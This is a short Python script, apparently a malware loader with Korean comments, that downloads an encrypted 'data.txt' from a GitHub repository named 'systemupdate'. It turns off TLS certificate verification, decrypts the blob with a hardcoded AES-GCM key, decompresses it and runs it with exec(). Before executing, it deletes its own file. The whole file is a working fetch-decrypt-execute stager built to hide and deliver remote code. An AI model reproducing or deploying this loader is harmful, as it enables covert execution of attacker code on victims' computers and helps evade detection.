# -*- coding: utf-8 -*-
"""뚱시스템 로더 — data.txt AES 복호화 + 실행 (GitHub API, CDN 캐시 회피)"""
import base64
import json
import os
import ssl
import urllib.request
import zlib

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
API = "https://api.github.com/repos/blacknut0319-del/systemupdate/contents/data.txt?ref=main"


def fetch_data_b64():
    req = urllib.request.Request(API, headers={"User-Agent": "ddong"})
    meta = json.loads(urllib.request.urlopen(req, timeout=20, context=ctx).read())
    return base64.b64decode(meta["content"]).decode("utf-8").strip()


try:
    b64_str = fetch_data_b64()
    raw = base64.b64decode(b64_str)
    g = AESGCM(KEY)
    n, e = raw[:12], raw[12:]
    code = zlib.decompress(g.decrypt(n, e, None)).decode("utf-8")
    try:
        os.remove(__file__)
    except Exception:
        pass
    exec(code)
except Exception as err:
    import ctypes

    ctypes.windll.user32.MessageBoxW(0, f"실행 실패: {err}", "오류", 0x10)
